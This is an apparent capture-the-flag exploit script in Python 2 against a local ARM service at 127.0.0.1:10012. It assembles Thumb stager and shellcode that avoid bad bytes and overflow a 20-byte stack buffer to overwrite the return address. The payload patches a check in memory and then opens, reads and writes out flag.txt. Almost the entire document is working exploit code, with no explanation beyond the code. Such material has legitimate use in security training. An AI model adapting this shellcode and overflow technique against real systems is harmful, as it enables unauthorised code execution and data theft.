stager_asm = '''.section .text
.global _start
.ascii "%s"
_start:
    # 14c8:	2800      	cmp	r0, #0
    mov r3, #0x14
    lsl r3, #8
    add r3, #0xc8
    eor r4, r4
    str r4, [r3]
    # 00001400 <_start>:
    mov r3, #0x14
    lsl r3, #8
    bx r3
.ascii "%s"
'''
asm = '''.section .text
.global _start

.ascii "%s"
_start:
    eor r4, r4, r4
    b get_addr
ret:
    mov r3, lr
    sub r3, #1
open:
    mov	r0, r3
    mov r1, r4
    mov	r2, r4
    bl open2
read:
    mov	r1, r7
    mov	r2, #0x7f
    bl read2
write:
    mov r0, r8
    mov r1, r7
    mov r2, #0x7f
    bl write2
exit:
    bl exit2
open2:
    bx	pc
    mov r8, r8
    .word 0xef000066
    .word 0xe12fff1e
read2:
    bx	pc
    mov r8, r8
    .word 0xef00006a
    .word 0xe12fff1e
write2:
    bx	pc
    mov r8, r8
    .word 0xef000069
    .word 0xe12fff1e
exit2:
    bx pc
    mov r8, r8
    .word 0xef000011
    .word 0xe12fff1e
get_addr:
    bl ret
.ascii "%s"
  '''

import os
from lib.mylib import *

ARCH = 'arm'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'
BUF_SIZE = 20

stager_asm = stager_asm % (BEGIN_MARKER, END_MARKER)
asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/b.S', mode='wb').write(stager_asm)
os.system(AS + ' /tmp/b.S -mthumb -mthumb-interwork -o /tmp/b.out')
exe = open('/tmp/b.out').read()
stager = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
xxd(stager)
if '\x00' in stager:
    raise Exception('has \\x00')
if '\x0a' in stager:
    raise Exception('has \\x0a')
if len(stager) > BUF_SIZE:
    raise Exception('too long')
stager = stager.ljust(BUF_SIZE, 'A')

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -mthumb -mthumb-interwork -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10012
s = mysock(IP, PORT)

sl(s, '\n000')
SP = 0x1b0c - BUF_SIZE - 4 + 1
first = stager + p(SP)[0:2] + '\n'
sl(s, first)

sl(s, '\n000')
SP = 0x1b0c + 1
shellcode = 'A' * BUF_SIZE + p(SP) + shellcode + '\n'
sl(s, shellcode)

shell(s)
